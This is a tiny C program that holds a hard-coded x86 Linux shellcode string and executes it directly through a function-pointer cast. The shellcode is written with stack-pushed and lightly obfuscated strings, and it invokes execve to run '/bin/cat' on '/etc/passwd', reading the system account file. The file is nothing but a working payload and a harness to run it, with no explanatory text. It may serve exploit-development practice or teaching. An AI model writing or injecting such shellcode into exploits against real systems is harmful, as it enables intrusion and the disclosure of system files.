#include "stdio.h"

const char shellcode[]= "j\x01\xfe\x0c$h/cath/bin\x89\xe3j\x01\xfe\x0c$hsswdhc/pah\x01\x01\x01\x01\x814$\x01.duh/cath/bin1\xc9Qj\rY\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80";

int main()
{
    (*(void (*)()) shellcode)();

    return 0;
}
